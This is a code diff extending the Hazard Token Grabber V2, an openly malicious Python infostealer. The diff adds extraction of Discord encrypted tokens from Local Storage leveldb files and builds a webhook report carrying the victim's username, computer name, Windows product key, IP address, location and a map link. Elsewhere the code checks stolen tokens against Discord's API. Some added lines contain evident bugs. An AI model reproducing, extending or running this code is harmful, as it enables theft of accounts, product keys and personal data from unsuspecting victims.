@@ -31,6 +31,7 @@ class Hazard_Token_Grabber_V2:
             pass
 
         self.tokens = []
+        self.encrypted_tokens = []
         self.discord_psw = []
         self.backup_codes = []
         
@@ -293,20 +294,33 @@ class Hazard_Token_Grabber_V2:
         for source, path in paths.items():
             if not os.path.exists(path):
                 continue
-            for file_name in os.listdir(path):
-                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                    continue
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    for regex in (self.regex):
-                        for token in findall(regex, line):
-                            try:
-                                r = requests.get(self.baseurl, headers=self.getheaders(token))
-                                if r.status_code == 200:
-                                    if token in self.tokens:
-                                        continue
-                            except Exception:
-                                pass
-                                self.tokens.append(token)
+            if "discord" not in path:
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (self.regex):
+                            for token in findall(regex, line):
+                                try:
+                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                    if r.status_code == 200:
+                                        if token in self.tokens:
+                                            continue
+                                except Exception:
+                                    pass
+                                    self.tokens.append(token)
+            else:
+                r = "dQw4w9WgXcQ"
+                path += "\\Local Storage\\leveldb"
+                for file_name in os.listdir(path):
+                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+                        continue
+                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+                        if r in line:
+                            token = (line[line.index(r):].split("\"", 1))[0]
+                            if token not in self.encrypted_tokens:
+                                self.encrypted_tokens.append(token)
+
         if os.path.exists(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
             for path, subdirs, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
@@ -410,6 +424,18 @@ class Hazard_Token_Grabber_V2:
         for f in files:
             self.files += f"\n{f}"
         self.fileCount = f"{len(files)} Files Found: "
+        description = f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
+
+        if len(self.encrypted_tokens > 0):
+            x = 1
+            description += "\n```Encrypted Tokens: "
+            for i in self.encrypted_tokens:
+                if len(self.encrypted_tokens) - x != 0:
+                    description += f"\n{i}\n"
+                else:
+                    description += f"\n{i}"
+                x = x - 1
+            description += "```"
         embed = {
             "avatar_url":"https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif",
             "embeds": [
@@ -419,7 +445,7 @@ class Hazard_Token_Grabber_V2:
                         "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
                         "icon_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif"
                     },
-                    "description": f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
+                    "description": description,
                     "color": 16119101,
 
                     "thumbnail": {
